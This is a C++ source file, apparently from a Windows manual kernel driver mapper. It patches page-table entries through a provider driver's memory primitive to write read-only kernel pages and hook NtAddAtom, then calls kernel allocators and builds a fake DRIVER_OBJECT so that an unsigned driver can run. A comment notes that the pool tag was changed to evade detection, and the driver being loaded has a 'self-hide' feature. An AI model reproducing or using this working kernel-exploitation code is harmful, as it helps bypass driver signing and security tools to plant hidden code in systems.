	//so max_pfn was 0, so every "pfn > 0 && pfn < max_pfn" below was false, so
	//the probe reported that the read-only write primitive was unavailable - and
	//Load turned that into STATUS_ACCESS_DENIED. The reported problem was a
	//failed Win32 call that has nothing to do with the PTE self-map.
	else {
		Log(L"[!] GlobalMemoryStatusEx failed (error "
			<< Val(static_cast<unsigned long>(GetLastError()))
			<< L"); the PTE probe is using a reduced physical memory bound" << std::endl);
	}

	/*
	 * The per-entry detail is buffered rather than printed as each value is
	 * computed: the success line summarises the same entries, and it is printed
	 * first, so the detail it summarises follows it instead of preceding it.
	 */
	std::vector<std::wstring> probe_details;

	// --- 4K level: KUSER_SHARED_DATA ---
	uint64_t kusd_pte = 0;
	const uint64_t kusd_pte_addr = PteAddressForBase(g_mmPteBase, kUserSharedData);
	const bool kusd_read = Driver::ReadMemory(kusd_pte_addr, &kusd_pte, sizeof(kusd_pte));
	{
		std::wostringstream detail;
		detail << L"[INFO] KUSER_SHARED_DATA PTE = " << Val(Hex(kusd_pte))
			<< L" | Present = " << Val(kusd_pte & 1)
			<< L" | RW = " << Val((kusd_pte >> 1) & 1)
			<< L" | User = " << Val((kusd_pte >> 2) & 1)
			<< L" | Large = " << Val((kusd_pte >> 7) & 1)
			<< L" | PFN = " << Val(Hex((kusd_pte >> 12) & 0xFFFFFFFFFULL))
			<< L" | Addr = " << Val(Hex(kusd_pte_addr));
		probe_details.push_back(detail.str());
	}

	const uint64_t kusd_pfn = (kusd_pte >> 12) & 0xFFFFFFFFFULL;
	const bool kusd_ok = kusd_read && (kusd_pte & 0x1) && !(kusd_pte & 0x4) && !(kusd_pte & (1ULL << 7)) &&
		kusd_pfn > 0 && kusd_pfn < max_pfn;

	// --- 2 MB level: ntoskrnl image base ---
	const uint64_t pde_base = PdeBaseFor(g_mmPteBase);
	uint64_t nt_pde = 0;
	const uint64_t nt_pde_addr = PdeAddressForBase(pde_base, Driver::ntoskrnlAddr);
	const bool nt_pde_read = Driver::ReadMemory(nt_pde_addr, &nt_pde, sizeof(nt_pde));
	{
		std::wostringstream detail;
		detail << L"[INFO] ntoskrnl base PDE = " << Val(Hex(nt_pde))
			<< L" | Present = " << Val(nt_pde & 1)
			<< L" | RW = " << Val((nt_pde >> 1) & 1)
			<< L" | User = " << Val((nt_pde >> 2) & 1)
			<< L" | Large = " << Val((nt_pde >> 7) & 1)
			<< L" | PFN = " << Val(Hex((nt_pde >> 12) & 0xFFFFFFFFFULL))
			<< L" | Addr = " << Val(Hex(nt_pde_addr));
		probe_details.push_back(detail.str());
	}

	const uint64_t nt_pde_pfn = (nt_pde >> 12) & 0xFFFFFFFFFULL;
	const bool nt_2mb_ok = nt_pde_read && (nt_pde & 0x1) && !(nt_pde & 0x4) && (nt_pde & (1ULL << 7)) &&
		nt_pde_pfn > 0 && nt_pde_pfn < max_pfn;

	//Fallback for a build where ntoskrnl is 4K mapped: its 4K PTE must then be a
	//present supervisor leaf.
	uint64_t nt_pte = 0;
	const uint64_t nt_pte_addr = PteAddressForBase(g_mmPteBase, Driver::ntoskrnlAddr);
	const bool nt_pte_read = Driver::ReadMemory(nt_pte_addr, &nt_pte, sizeof(nt_pte));
	if (!nt_2mb_ok) {
		std::wostringstream detail;
		detail << L"[INFO] ntoskrnl base PTE = " << Val(Hex(nt_pte))
			<< L" | Present = " << Val(nt_pte & 1)
			<< L" | User = " << Val((nt_pte >> 2) & 1)
			<< L" | Large = " << Val((nt_pte >> 7) & 1)
			<< L" | Addr = " << Val(Hex(nt_pte_addr));
		probe_details.push_back(detail.str());
	}
	const uint64_t nt_pte_pfn = (nt_pte >> 12) & 0xFFFFFFFFFULL;
	const bool nt_4k_ok = nt_pte_read && (nt_pte & 0x1) && !(nt_pte & 0x4) && !(nt_pte & (1ULL << 7)) &&
		nt_pte_pfn > 0 && nt_pte_pfn < max_pfn;

	const bool nt_ok = nt_2mb_ok || nt_4k_ok;

	/*
	 * Ground-truth cross-check.
	 *
	 * KUSER_SHARED_DATA is one physical page mapped at two different virtual
	 * addresses: the kernel alias 0xFFFFF78000000000 and the per-process user
	 * alias 0x000000007FFE0000. Both PTEs live in the same self-mapped page
	 * tables, so if the base is right, the two entries it produces must both be
	 * present and must name the same page frame. Nothing except a base that
	 * really indexes the page tables can make two independent virtual addresses
	 * resolve to one PFN, so this proves the geometry instead of trusting the
	 * shape of a single entry - the check a merely plausible-looking base would
	 * otherwise pass and then corrupt memory with.
	 *
	 * The assumption this rests on, stated because it is a real one and not
	 * visible in the code: user-half page tables are per process, so reading the
	 * PTE for 0x000000007FFE0000 only yields the right entry while the provider's
	 * copy runs in a context that has this process's user-half tables mapped.
	 * The provider executes in the caller's process today, so it holds. Were the
	 * IOCTL ever serviced from a system thread or from a different process, this
	 * read would describe a different virtual address and the comparison would
	 * fail - and failing here is safe: the probe returns false and Load aborts
	 * with the read-only write primitive reported unavailable, rather than
	 * continuing on a base it could not prove. The kernel-half controls above are
	 * unconditional and still cover the geometry on their own; this one is an
	 * additional proof, not the only one.
	 */
	const uint64_t kUserSharedDataUser = 0x000000007FFE0000ULL;
	uint64_t kusd_user_pte = 0;
	const uint64_t kusd_user_pte_addr = PteAddressForBase(g_mmPteBase, kUserSharedDataUser);
	const bool kusd_user_read = Driver::ReadMemory(kusd_user_pte_addr, &kusd_user_pte, sizeof(kusd_user_pte));
	const uint64_t kusd_user_pfn = (kusd_user_pte >> 12) & 0xFFFFFFFFFULL;
	const bool kusd_user_ok = kusd_user_read && (kusd_user_pte & 0x1) && !(kusd_user_pte & (1ULL << 7)) &&
		kusd_user_pfn > 0 && kusd_user_pfn < max_pfn;

	const bool kusd_pfn_match = kusd_ok && kusd_user_ok && (kusd_pfn == kusd_user_pfn);

	{
		std::wostringstream detail;
		detail << L"[INFO] KUSER_SHARED_DATA Dual-Map | KernelPFN = " << Val(Hex(kusd_pfn))
			<< L" | UserPFN = " << Val(Hex(kusd_user_pfn))
			<< L" | UserAddr = " << Val(Hex(kusd_user_pte_addr))
			<< L" | PFNMatch = " << Val(kusd_pfn_match ? L"Yes" : L"No");
		probe_details.push_back(detail.str());
	}

	{
		std::wostringstream detail;
		detail << L"[INFO] Self-Map Summary | KUSER_SHARED_DATA 4K " << Val(kusd_ok ? L"OK" : L"Bad")
			<< L" | Dual-Map PFN " << Val(kusd_pfn_match ? L"Match" : L"MISMATCH")
			<< L" | ntoskrnl " << Val(nt_2mb_ok ? L"2MB Leaf" : (nt_4k_ok ? L"4K Leaf" : L"Bad"));
		probe_details.push_back(detail.str());
	}

	if (kusd_ok && kusd_pfn_match && nt_ok) {
		g_pteSelfMapBase = g_mmPteBase;
		g_pdeSelfMapBase = pde_base;
		g_pteSelfMapReady = true;
		Log(L"[+] Kernel PTE self-map verified: PTE base = " << Val(Hex(g_pteSelfMapBase))
			<< L" | PDE base = " << Val(Hex(g_pdeSelfMapBase))
			<< L" | KUSER_SHARED_DATA 4K Leaf " << Val(L"OK")
			<< L" | ntoskrnl " << Val(nt_2mb_ok ? L"2MB Leaf" : L"4K Leaf") << L" OK" << std::endl);
		//Separates the verified summary from the per-entry detail it summarises.
		LogBlank();
		for (const auto& detail : probe_details)
			Log(detail << std::endl);
		return true;
	}

	Log(L"[-] Kernel PTE self-map could not be verified, writes to read-only pages are disabled" << std::endl);
	for (const auto& detail : probe_details)
		Log(detail << std::endl);
	return false;
}

/*
 * Write to a page the CPU currently treats as read-only.
 *
 * The provider's memcpy runs with the page permissions applied, so writing to
 * read-only kernel memory faults in kernel context, which is an instant
 * bugcheck. To avoid that, the page table entries covering the target are made
 * writable for the duration of the copy and restored afterwards.
 *
 * Steps:
 *   1. require a verified self-map (see ProbePteSelfMapBase)
 *   2. compute the pages the write spans, refuse anything too wide
 *   3. for each page pick the entry that actually controls it: the 2 MB PDE
 *      when the page is part of a large page (PS=1), otherwise the 4K PTE
 *   4. save that entry, then set RW and clear NX on it
 *   5. perform the write
 *   6. restore every saved entry
 *
 * The original entries are restored on every path after they are read,
 * including when the write fails, so a failed attempt does not leave kernel
 * pages writable.
 *
 * No TLB invalidation is performed between the patch and the write. That is
 * not an oversight and cannot be fixed from here: see the note at the write
 * itself, which explains why the invalidation this function would need is not
 * reachable without recursing into this same function.
 */
	bool Driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
		if (!address || !buffer || !size)
			return false;

		if (!ProbePteSelfMapBase())
			return false;

		const uint64_t first_page = address & ~0xFFFULL;
		const uint64_t last_page = (address + (uint64_t)size - 1) & ~0xFFFULL;
		const uint32_t page_count = (uint32_t)((last_page - first_page) / 0x1000) + 1;

		struct PatchedEntry { uint64_t entry_address; uint64_t original; };
		PatchedEntry patched[16];
		uint32_t patched_count = 0;

		if (page_count > 16) {
			Log(L"[-] WriteToReadOnlyMemory: write spans too many pages (" << Val(page_count) << L")" << std::endl);
			return false;
		}

		//Restores every entry recorded in patched[0 .. patched_count). Called on
		//every exit path after the first successful patch, so a failure part way
		//through cannot leave kernel pages writable. The per-entry line is
		//verbose-only: on a normal run it would print the same entry many times.
		auto restore_patched_entries = [&]() {
			for (uint32_t i = 0; i < patched_count; ++i) {
				WriteMemory(patched[i].entry_address, &patched[i].original, sizeof(patched[i].original));
				if (Console::Verbose())
					Log(L"[INFO] Restored page-table entry at " << Val(reinterpret_cast<void*>(patched[i].entry_address)) << std::endl);
			}
		};

		for (uint32_t page = 0; page < page_count; ++page) {
			const uint64_t target = first_page + (uint64_t)page * 0x1000;

			/*
			 * Large pages have no 4K PTE. Their protection lives in the 2 MB
			 * PDE, and the 4K "PTE" address for such a VA does not point at an
			 * entry at all - it aliases the page content, because the self-map
			 * walk terminates at the large PDE. That is the whole reason a read
			 * of the ntoskrnl image base came back as its MZ header, and why a
			 * write went straight into the read-only .text page and bugchecked
			 * 0x50. Read the PDE and, when PS=1, patch the PDE instead.
			 */
			const uint64_t pde_address = PdeAddressFor(target);
			uint64_t pde = 0;
			if (!ReadMemory(pde_address, &pde, sizeof(pde))) {
				Log(L"[-] Failed to read PDE at " << Val(reinterpret_cast<void*>(pde_address)) << std::endl);
				restore_patched_entries();
				return false;
			}

			const bool large = (pde & 0x1) && (pde & (1ULL << 7));
			const uint64_t entry_address = large ? pde_address : PteAddressFor(target);

			//Every 4K page of one 2 MB page shares a single PDE, so the same
			//entry must not be recorded (and restored) twice.
			bool already = false;
			for (uint32_t i = 0; i < patched_count; ++i) {
				if (patched[i].entry_address == entry_address) { already = true; break; }
			}
			if (already)
				continue;

			uint64_t original = 0;
			if (!ReadMemory(entry_address, &original, sizeof(original))) {
				Log(L"[-] Failed to read page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
				restore_patched_entries();
				return false;
			}

			if (!(original & 0x1)) {
				Log(L"[-] Page-table entry " << Val(Hex(original))
					<< L" at " << Val(reinterpret_cast<void*>(entry_address)) << L" is not present" << std::endl);
				restore_patched_entries();
				return false;
			}
			if (!large && (original & (1ULL << 7))) {
				Log(L"[-] Unexpected large-page PTE at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
				restore_patched_entries();
				return false;
			}

			uint64_t patched_value = original;
			patched_value |= 0x2;             //RW
			patched_value &= ~(1ULL << 63);   //NX

			//Recorded before the write succeeds, so the restore always undoes
			//exactly what was done.
			if (!WriteMemory(entry_address, &patched_value, sizeof(patched_value))) {
				Log(L"[-] Failed to patch page-table entry at " << Val(reinterpret_cast<void*>(entry_address)) << std::endl);
				restore_patched_entries();
				return false;
			}

			patched[patched_count].entry_address = entry_address;
			patched[patched_count].original = original;
			++patched_count;
		}

		/*
		 * No TLB invalidation is performed between the patch and the write.
		 *
		 * A stale read-only translation for the target page would make the
		 * copy below fault inside the provider (bugcheck 0x50), so invalidating
		 * the translation is exactly what should happen here. It cannot be done
		 * from this process: the only way to run kernel code is
		 * CallKernelFunction, and that installs its hook by calling this very
		 * function to write the read-only NtAddAtom page. Invalidating here by
		 * calling into the kernel would therefore re-enter this function from
		 * inside its own patch and recurse without bound - a guaranteed stack
		 * overflow, worse than the fault it is meant to prevent. This function
		 * has no other caller than that hook patch, so there is no outer write
		 * it could protect either.
		 *
		 * Residual risk, stated plainly: if this CPU still holds a read-only
		 * translation for the target page when the copy runs, the copy faults
		 * and the process bugchecks. In practice the page-table patch is what
		 * makes the entry writable once it is re-walked, and the patch is
		 * written before the copy, so a translation that is not cached, or one
		 * evicted since the page was last read as read-only, resolves to the
		 * new writable entry. Nothing here guarantees the cached case away, and
		 * no user-mode instruction can flush a kernel translation.
		 */
		const bool result = WriteMemory(address, buffer, size);

		restore_patched_entries();

		if (!result)
			Log(L"[-] Write through patched page-table entry failed for " << Val(reinterpret_cast<void*>(address)) << std::endl);

		return result;
	}

/*
 * The assumed 4-argument signature of MmAllocateIndependentPagesEx.
 *
 * The routine has no prototype in the public SDK, so this is the shape the
 * mapper calls it with, written down in one place. The call below goes through
 * CallKernelFunction, which forwards arguments through registers and accepts
 * any list, so the compiler would not catch a drift between this typedef and
 * the real prototype - the typedef exists so the assumption is explicit and
 * reviewable instead of implied by the argument list at the call site.
 *
 * The arguments are (size, -1, 0, 0): size is the requested length, and the
 * three trailing values are the partition and reserved parameters the
 * reference implementation passes.
 */
typedef PVOID(__stdcall* MmAllocateIndependentPagesExFn)(uint32_t size, int partition, int reserved1, int reserved2);

//Allocate page aligned kernel memory for the --indPages mode, which needs one
//allocation whose protection can be set per section.
//Returns 0 on failure.
uint64_t Driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = SymbolsHandler::GetInstance()->GetOffset(L"MmAllocateIndependentPagesEx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[-] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
		kernel_MmAllocateIndependentPagesEx += Driver::ntoskrnlAddr;
	}
	//(size, -1, 0, 0) matches the assumed MmAllocateIndependentPagesExFn above.
	if (!Driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

//Release an allocation made by MmAllocateIndependentPagesEx.
bool Driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = SymbolsHandler::GetInstance()->GetOffset(L"MmFreeIndependentPages");
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[-] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
		kernel_MmFreeIndependentPages += Driver::ntoskrnlAddr;
	}

	return Driver::CallKernelFunction<void>(nullptr, kernel_MmFreeIndependentPages, address, size);
}

//Set the protection on a range of an independent-pages allocation.
//Only meaningful in AllocateIndependentPages mode; a pool allocation cannot
//have its protection changed this way.
//Returns FALSE on failure.
BOOLEAN Driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[-] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = SymbolsHandler::GetInstance()->GetOffset(L"MmSetPageProtection");
		if (!kernel_MmSetPageProtection) {
			Log(L"[-] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
		kernel_MmSetPageProtection += Driver::ntoskrnlAddr;
	}

	BOOLEAN set_prot_status{};
	if (!Driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

//Allocate a nonpaged pool block for the mapped image.
//The pool tag is fixed and the allocation is one RWX block: the provider cannot
//apply per section protection to it, which is what AllocateIndependentPages
//exists to work around.
uint64_t Driver::AllocatePool(Nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	//Retry-on-zero, not one-shot static initialisation. With a one-shot
	//initializer a lookup that failed once was cached as a permanent failure and
	//every later call reported the same error without retrying. The other four
	//resolvers in this file already used the retry form; this makes them all the
	//same shape.
	static uint64_t kernel_ExAllocatePool = 0;
	if (!kernel_ExAllocatePool) {
		kernel_ExAllocatePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
		if (!kernel_ExAllocatePool) {
			Log(L"[-] Failed to find ExAllocatePoolWithTag" << std::endl);
			return 0;
		}
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) //Changed pool tag since an extremely meme checking diff between allocation size and average for detection....
		return 0;

	return allocated_pool;
}

//Allocate a page aligned, physically contiguous block for the mapped image.
//ExAllocatePoolWithTag only guarantees 16-byte alignment, so a pool block can
//share its first and last page with a POOL_HEADER or with the neighbouring
//block. A driver that blanks whole pages of its own image (memhv's self-hide)
//would then zero pool metadata the guest allocator still reads, which is an
//arbitrary write on the next free/coalesce. MmAllocateContiguousMemory returns
//a page aligned base, so every page of the image belongs to the image alone.
//Returns 0 on failure.
uint64_t Driver::AllocateContiguous(uint64_t size) {
	if (!size)
		return 0;

	//Retry-on-zero, same shape as AllocatePool: a lookup that failed once is
	//not cached as a permanent failure.
	static uint64_t kernel_MmAllocateContiguousMemory = 0;
	if (!kernel_MmAllocateContiguousMemory) {
		kernel_MmAllocateContiguousMemory = GetKernelModuleExport(Driver::ntoskrnlAddr, "MmAllocateContiguousMemory");
		if (!kernel_MmAllocateContiguousMemory) {
			Log(L"[-] Failed to find MmAllocateContiguousMemory" << std::endl);
			return 0;
		}
	}

	uint64_t allocated_contiguous = 0;

	//The second argument is a PHYSICAL_ADDRESS passed by value; -1 means "no
	//upper bound", i.e. anywhere in physical memory.
	if (!CallKernelFunction(&allocated_contiguous, kernel_MmAllocateContiguousMemory, size, static_cast<int64_t>(-1)))
		return 0;

	return allocated_contiguous;
}

//Release a block allocated by AllocateContiguous.
bool Driver::MmFreeContiguousMemory(uint64_t address) {
	if (!address)
		return false;

	static uint64_t kernel_MmFreeContiguousMemory = 0;
	if (!kernel_MmFreeContiguousMemory) {
		kernel_MmFreeContiguousMemory = GetKernelModuleExport(Driver::ntoskrnlAddr, "MmFreeContiguousMemory");
		if (!kernel_MmFreeContiguousMemory) {
			Log(L"[-] Failed to find MmFreeContiguousMemory" << std::endl);
			return false;
		}
	}

	return CallKernelFunction<void>(nullptr, kernel_MmFreeContiguousMemory, address);
}

//Release a pool block allocated by AllocatePool.
bool Driver::FreePool(uint64_t address) {
	if (!address)
		return false;

	static uint64_t kernel_ExFreePool = 0;
	if (!kernel_ExFreePool) {
		kernel_ExFreePool = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExFreePool");
		if (!kernel_ExFreePool) {
			Log(L"[-] Failed to find ExFreePool" << std::endl);
			return false;
		}
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

/*
 * DRIVER_OBJECT construction.
 *
 * Type is IO_TYPE_DRIVER (0x04 in wdm.h), not _OBJECT_TYPE_DRIVER: the kernel
 * keeps a pointer to the object type elsewhere, while .Type is the object's
 * kind. The mapper itself does not need it - IoCreateDevice looks at
 * DriverExtension - but a driver that validates its own object does, and
 * memhv's Entry() rejects the object unless Type == IO_TYPE_DRIVER.
 */
static constexpr uint16_t kDriverObjectType = 0x04; // IO_TYPE_DRIVER

/*
 * Type is the first member of every _OBJECT_HEADER-derived structure in the
 * kernel and has not moved on any released build, so unlike the fields below it
 * is not resolved through the PDB. The write is still bounds checked.
 */
static constexpr uint32_t kDriverObjectTypeOffset = 0x00;

/*
 * Allocation sizes.
 *
 * Both blocks are sized from the structure the PDB describes rather than from a
 * compiled sizeof, because the offsets are this build's and a fixed constant
 * would be wrong on a build that grew either structure. The floors are the x64
 * sizes as a backstop for a build that resolved no fields at all.
 */
static constexpr uint64_t kMinDriverObjectSize = 0x150; //sizeof(_DRIVER_OBJECT) on x64
static constexpr uint64_t kMinDriverExtensionSize = 0x60; //through DriverProxyExtension

/*
 * The size the driver object block has to be, from the offsets in use.
 *
 * Shared by the constructor and the teardown on purpose. The constructor takes
 * max(floor, highest written field + its size) and the teardown used to bound its
 * read by the floor alone, so on a build whose resolved _DRIVER_OBJECT.DriverUnload
 * sits past 0x150 - which is exactly the case the max() in the constructor exists
 * to handle - ReadBoundedPointer refused, DestroyDriverObjectForEntry returned
 * false, and both pool blocks leaked. Deriving it from the same expression at
 * both ends means the two cannot disagree.
 *
 * Every field the constructor writes is included, not only DriverUnload: the
 * constructor's own bound has to cover all of them, and the teardown has to
 * agree with whatever the constructor actually sized.
 */
static uint64_t DriverObjectNeededSize() {
	const auto& o = Driver::g_offsets;

	uint64_t needed = kMinDriverObjectSize;

	const auto require = [&needed](uint32_t offset, uint64_t width) {
		const uint64_t end = static_cast<uint64_t>(offset) + width;
		if (end > needed)
			needed = end;
	};

	require(o.DriverObject_Size, sizeof(USHORT));
	require(o.DriverObject_Flags, sizeof(ULONG));
	require(o.DriverObject_DriverStart, sizeof(uint64_t));
	require(o.DriverObject_DriverSize, sizeof(ULONG));
	require(o.DriverObject_DriverSection, sizeof(uint64_t));
	require(o.DriverObject_DriverExtension, sizeof(uint64_t));
	require(o.DriverObject_DriverUnload, sizeof(uint64_t));
	require(kDriverObjectTypeOffset, sizeof(uint16_t));

	return needed;
}

//A zero page used to clear a kernel allocation without a user mode buffer.
static constexpr BYTE kZeroPage[4096] = {};

//Zero size bytes at destination, through the provider.
static bool ZeroKernelMemory(uint64_t destination, uint64_t size) {
	uint64_t done = 0;
	while (done < size) {
		const uint64_t chunk = (size - done) < sizeof(kZeroPage) ? (size - done) : sizeof(kZeroPage);
		if (!Driver::MemCopy(destination + done, reinterpret_cast<uint64_t>(kZeroPage), chunk))
			return false;
		done += chunk;
	}
	return true;
}

/*
 * Write value into object + offset, after proving the write fits inside object.
 *
 * Every field of the object and the extension goes through this. The offsets are
 * file controlled in the sense that they come from Offsets.ini, so a wrong entry
 * would otherwise write into neighbouring pool memory or past the block.
 */
template<typename T>
static bool WriteBounded(uint64_t object, uint64_t object_size, uint32_t offset, const T& value) {
	if (offset > object_size || sizeof(T) > object_size - offset)
		return false;
	return Driver::MemCopy(object + offset, reinterpret_cast<uint64_t>(&value), sizeof(T));
}

//Read back a pointer-sized field and require it to be one this process holds.
static bool ReadBoundedPointer(uint64_t object, uint64_t object_size, uint32_t offset, uint64_t& out) {
	if (offset > object_size || sizeof(uint64_t) > object_size - offset)
		return false;
	out = 0;
	return Driver::ReadMemory(object + offset, &out, sizeof(out));
}

//Read back a ULONG field, bounded the same way.
static bool ReadBoundedULong(uint64_t object, uint64_t object_size, uint32_t offset, uint32_t& out) {
	if (offset > object_size || sizeof(uint32_t) > object_size - offset)
		return false;
	out = 0;
	return Driver::ReadMemory(object + offset, &out, sizeof(out));
}

uint64_t Driver::CreateDriverObjectForEntry(uint64_t driver_start, uint64_t driver_size, uint64_t driver_section) {
	if (!driver_start || !driver_size) {
		Log(L"[-] CreateDriverObjectForEntry: refusing to build an object for an image that has no base or no size" << std::endl);
		return 0;
	}

	//_DRIVER_OBJECT.DriverSize is a ULONG, so the kernel itself can only
	//describe an image up to 4 GB. Writing a truncated 64-bit size instead
	//would leave the object describing a shorter image than the one that is
	//actually resident, which is a field the loader and any driver that asks
	//for its own module size will read back.
	if (driver_size > 0xFFFFFFFFull) {
		Log(L"[-] CreateDriverObjectForEntry: image size " << Val(Hex(driver_size))
			<< L" does not fit in _DRIVER_OBJECT.DriverSize (ULONG)" << std::endl);
		return 0;
	}

	const auto& o = Driver::g_offsets;

	/*
	 * The blocks cover every offset the resolved layout can name, plus the x64
	 * floor. The extension pointer sits near the end of the object on x64, so a
	 * block sized only to sizeof would truncate it on a build whose resolved
	 * offsets differ. Derived from the same expression DestroyDriverObjectForEntry
	 * uses, so the two ends of the block's lifetime agree on its size.
	 */
	const uint64_t object_needed = DriverObjectNeededSize();

	const uint64_t extension_needed = (std::max)(kMinDriverExtensionSize,
		static_cast<uint64_t>(o.DriverExtension_DriverObject) + sizeof(uint64_t));

	const uint64_t extension = AllocatePool(Nt::POOL_TYPE::NonPagedPool, extension_needed);
	if (!extension) {
		Log(L"[-] CreateDriverObjectForEntry: failed to allocate the driver extension" << std::endl);
		return 0;
	}

	const uint64_t object = AllocatePool(Nt::POOL_TYPE::NonPagedPool, object_needed);
	if (!object) {
		Log(L"[-] CreateDriverObjectForEntry: failed to allocate the driver object" << std::endl);
		FreePool(extension);
		return 0;
	}

	//Both cleared first. Every field below is then written deliberately, so a
	//member the PDB does not describe is zero rather than pool residue.
	if (!ZeroKernelMemory(extension, extension_needed) || !ZeroKernelMemory(object, object_needed)) {
		Log(L"[-] CreateDriverObjectForEntry: failed to clear the new objects" << std::endl);
		FreePool(object);
		FreePool(extension);
		return 0;
	}

	/*
	 * The extension's self-reference.
	 *
	 * _DRIVER_EXTENSION begins with DriverObject, at offset 0 - the PDB type
	 * stream has no Size member and no member named Driver, so an earlier
	 * version of this code that guessed "Size at 0, Driver at 0x18" would have
	 * written a 4-byte length over the low half of the back-pointer and the
	 * object pointer into ServiceKeyName. IoCreateDevice compares
	 * DriverObject->DriverExtension->DriverObject against the object it was
	 * handed, so getting this field wrong is what decides whether a real driver
	 * can call IoCreateDevice at all.
	 *
	 * Nothing else in the extension is written. AddDevice and the callback
	 * lists stay zero, which is the documented "not registered" value.
	 */
	if (!WriteBounded(extension, extension_needed, o.DriverExtension_DriverObject, object)) {
		Log(L"[-] CreateDriverObjectForEntry: the driver extension back-pointer falls outside the allocation" << std::endl);
		FreePool(object);
		FreePool(extension);
		return 0;
	}

	//The object itself. DriverUnload, DriverInit, DriverStartIo and every entry
	//of MajorFunction stay zero, which is the documented "this driver has
	//unloaded / has no handler" value and is what a driver checks for.
	if (!WriteBounded(object, object_needed, o.DriverObject_Size, (USHORT)object_needed) ||
		!WriteBounded(object, object_needed, o.DriverObject_DriverStart, driver_start) ||
		!WriteBounded(object, object_needed, o.DriverObject_DriverSize, (ULONG)driver_size) ||
		!WriteBounded(object, object_needed, o.DriverObject_DriverSection, driver_section) ||
		!WriteBounded(object, object_needed, o.DriverObject_DriverExtension, extension) ||
		!WriteBounded(object, object_needed, o.DriverObject_Flags, (ULONG)0) ||
		!WriteBounded(object, object_needed, o.DriverObject_DriverUnload, (uint64_t)0) ||
		!WriteBounded(object, object_needed, kDriverObjectTypeOffset, kDriverObjectType)) {
		Log(L"[-] CreateDriverObjectForEntry: driver object fields fall outside the allocation" << std::endl);
		FreePool(object);
		FreePool(extension);
		return 0;
	}

	/*
	 * Read back what matters rather than trusting the writes.
	 *
	 * A struct the kernel will dereference before the driver registers anything
	 * has to be provably right here, because a wrong pointer is a bugcheck
	 * inside IoCreateDevice rather than a clean failure the mapper can report.
	 */
	uint64_t check_extension = 0;
	uint64_t check_section = 0;
	uint64_t check_start = 0;
	uint32_t check_driver_size = 0;

	const bool readable =
		ReadBoundedPointer(object, object_needed, o.DriverObject_DriverExtension, check_extension) &&
		ReadBoundedPointer(object, object_needed, o.DriverObject_DriverSection, check_section) &&
		ReadBoundedPointer(object, object_needed, o.DriverObject_DriverStart, check_start) &&
		ReadBoundedULong(object, object_needed, o.DriverObject_DriverSize, check_driver_size);

	uint64_t check_back_pointer = 0;
	const bool back_readable = readable &&
		ReadBoundedPointer(extension, extension_needed, o.DriverExtension_DriverObject, check_back_pointer);

	if (!readable || !back_readable ||
		check_extension != extension ||
		check_section != driver_section ||
		check_start != driver_start ||
		check_driver_size != static_cast<uint32_t>(driver_size) ||
		check_back_pointer != object) {
		Log(L"[-] CreateDriverObjectForEntry: the object did not read back as written; refusing to hand it to DriverEntry" << std::endl);
		FreePool(object);
		FreePool(extension);
		return 0;
	}

	LogBlank();
	Log(L"[+] DriverObject Built At " << Val(reinterpret_cast<void*>(object))
		<< L" | Extension " << Val(reinterpret_cast<void*>(extension))
		<< L" | Size " << Val(Hex(object_needed))
		<< L" | Start " << Val(reinterpret_cast<void*>(driver_start))
		<< L" | Image Size " << Val(Hex(check_driver_size))
		<< L" | Fields From Symbols " << Val(o.DriverObjectResolvedCount)
		<< L"/" << Val(DriverOffsets::kDriverObjectResolvableFieldCount) << std::endl);

	return object;
}

bool Driver::DestroyDriverObjectForEntry(uint64_t driver_object) {
	if (!driver_object)
		return false;

	//The extension address is recovered from the object rather than cached, so
	//the two can never drift apart. Bounded by the size the block was actually
	//allocated at - the same expression the constructor used - rather than by the
	//x64 floor, which is smaller than the block on any build whose resolved
	//_DRIVER_OBJECT offsets reach past it.
	uint64_t extension = 0;
	if (!ReadBoundedPointer(driver_object, DriverObjectNeededSize(), Driver::g_offsets.DriverObject_DriverExtension, extension) ||
		!IsKernelAddress(extension)) {
		Log(L"[-] DestroyDriverObjectForEntry: could not recover the extension address" << std::endl);
		return false;
	}

	const bool object_freed = FreePool(driver_object);
	const bool extension_freed = FreePool(extension);

	return object_freed && extension_freed;
}

/*
 * Upper bound on the entry counts of an export directory.
 *
 * A real kernel module has a few thousand exports at most. The cap exists so a
 * module whose NumberOfNames or NumberOfFunctions is garbage cannot turn the
 * walk below into an unbounded scan; the per-table size checks are what
 * actually prove the tables fit, this only keeps the loop count sane.
 */
static constexpr uint32_t kMaxExportEntries = 0x10000;

//e_lfanew is dereferenced before SizeOfImage is known, so it is bounded by a
//value no real module exceeds: the NT headers of every Windows image sit within
//the first page, and the DOS stub that precedes them is a few hundred bytes.
static constexpr LONG kMaxNtHeaderOffset = 0x1000;

/*
 * Read a NUL terminated string out of a kernel module image, bounded.
 *
